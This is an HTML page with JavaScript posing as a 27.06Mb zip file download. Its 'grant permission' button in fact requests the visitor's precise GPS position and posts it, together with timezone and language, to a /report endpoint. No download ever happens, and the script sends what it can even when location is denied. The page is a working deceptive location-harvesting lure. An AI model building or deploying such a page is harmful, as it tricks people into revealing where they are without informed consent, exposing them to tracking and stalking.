<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Download your zip file</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
</head>
<body style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial; padding:18px;">
  <h2>Download your zip file</h2>
  <p id="status">Waiting for action…</p>
  <button id="sendBtn">Grant permission to download your file</button>
  <p style="font-size:0.9rem;color:#555;margin-top:12px">
    27.06Mb Zip file... Your download will start after grant permission  — allow if you consent.
  </p>

<script>
const status = document.getElementById("status");
const btn = document.getElementById("sendBtn");

async function sendReport(gps) {
  status.textContent = "Sending data to server…";
  const extra = {
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    language: navigator.language || null
  };

  try {
    const res = await fetch("/report", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ gps: gps, extra: extra })
    });
    const j = await res.json();
    status.textContent = "Server response: " + (j.status || JSON.stringify(j));
  } catch (e) {
    status.textContent = "Failed to send: " + e.toString();
  }
}

btn.addEventListener("click", async () => {
  status.textContent = "Requesting permission…";
  if (!navigator.geolocation) {
    status.textContent = "Geolocation not supported in this browser.";
    return;
  }
  navigator.geolocation.getCurrentPosition(
    pos => {
      const gps = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      };
      status.textContent = `Got GPS. Lat: ${gps.lat.toFixed(6)}, Lon: ${gps.lon.toFixed(6)}, accuracy: ${gps.accuracy}m. Sending...`;
      sendReport(gps);
    },
    err => {
      // user denied or other error — still send what we can (no gps)
      status.textContent = "Denied or unavailable: " + (err.message || err.code);
      sendReport(null);
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
});
</script>
</body>
</html>
